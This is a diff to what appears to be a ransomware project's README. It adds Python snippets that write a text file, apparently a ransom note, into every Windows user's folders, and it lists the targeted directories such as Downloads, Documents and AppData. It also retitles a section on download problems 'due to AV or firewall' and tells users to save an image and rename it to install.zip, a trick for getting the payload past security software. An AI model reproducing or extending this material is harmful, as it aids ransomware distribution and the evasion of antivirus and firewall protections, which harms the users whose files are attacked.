@@ -37,7 +37,9 @@ C:\ranso.log
 
 ## Folder Locations (All users on the Windows System.)
 
+Python: 
 
+```
             f = open("%s/%s"%(usr,filename), "w")
             f.write(txt)
             f.close()
@@ -68,8 +70,24 @@ C:\ranso.log
             f = open("%s/Searches/%s"%(usr,filename), "w")
             f.write(txt)
             f.close()
+```
 
-## Issues downloading? 
+Plain: 
+
+```
+(All Users) -> User Root Dir
+(All Users) -> Downloads
+(All Users) -> Documents
+(All Users) -> Contacts
+(All Users) -> AppData
+(All Users) -> Favorites
+(All Users) -> Links
+(All Users) -> Pictures
+(All Users) -> Videos
+(All Users) -> Searches
+```
+
+## Issues downloading (Due to AV or firewall)? 
 
 Save this image and rename to install.zip
 
